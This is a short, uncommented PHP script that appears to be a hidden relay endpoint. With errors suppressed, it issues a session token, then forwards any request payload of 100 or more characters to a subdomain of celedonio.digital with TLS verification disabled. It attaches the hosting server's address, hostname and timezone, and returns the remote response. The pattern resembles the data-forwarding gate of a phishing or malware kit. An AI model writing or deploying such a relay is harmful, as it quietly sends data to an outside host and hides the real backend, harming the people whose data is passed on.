<?php

error_reporting(0);
session_start();

$payload = file_get_contents('php://input');
if (empty($payload)) {
  $payload = $_POST;
}

if (!empty(getallheaders())) {
  $set_headers = [];
  foreach(getallheaders() as $hkey => $hval) {
    $set_headers[trim(strtolower(str_replace('-', '_', $hkey)))] = $hval;
  }
}

$responder = false;

if (isset($payload) && !empty($payload)) {

  $uri = array_values(array_filter(explode('/', $_SERVER['REQUEST_URI'])));
  $pld = json_decode($payload, true);

  if (strlen($pld['payload']) >= 100 && $_SESSION['csrf'] == $set_headers['csrf_key']) {

    $ch = curl_init('https://'.$uri[0].'.celedonio.digital/'.$uri[1].'/'.$uri[2]);
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'Client-Addr: ' . $_SERVER['SERVER_ADDR'],
        'Client-Host: ' . $_SERVER['SERVER_NAME'],
        'Client-Tmzn: ' . date_default_timezone_get()
    ]);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([$pld['payload']]));
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($ch);
    curl_close($ch);
    echo $response;
    $responder = true;

  }

  if (trim(strtolower($pld['payload'])) == 'csrf') {

    if (!isset($_SESSION['csrf'])) {
      $_SESSION['csrf'] = md5(base64_encode(time()));
    }
    echo $_SESSION['csrf'];
    $responder = true;

  }

}

if (!$responder) {
  echo json_encode([ 'error' => true, 'message' => 'Invalid Access' ]);
}
